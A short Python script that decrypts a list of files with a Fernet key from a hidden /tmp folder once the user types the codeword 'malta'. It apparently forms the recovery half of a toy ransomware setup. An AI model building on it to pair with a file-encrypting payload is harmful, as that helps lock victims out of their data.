import os
from os.path import abspath, dirname

from cryptography.fernet import Fernet, MultiFernet

with open('/tmp/hvs45pasdf4hb/list.txt') as f:
    files = f.read().splitlines()

with open('/tmp/hvs45pasdf4hb/thekey.key', 'rb') as f:
    key = content = f.read()

codeword = 'malta'

user_phrase = input('tell me ')

if user_phrase == codeword:
    for file in files:
        with open (file, 'rb') as f:
            content_encripted = f.read()
        content = Fernet(key).decrypt(content_encripted)
        with open (file, 'wb') as f:
            f.write(content)
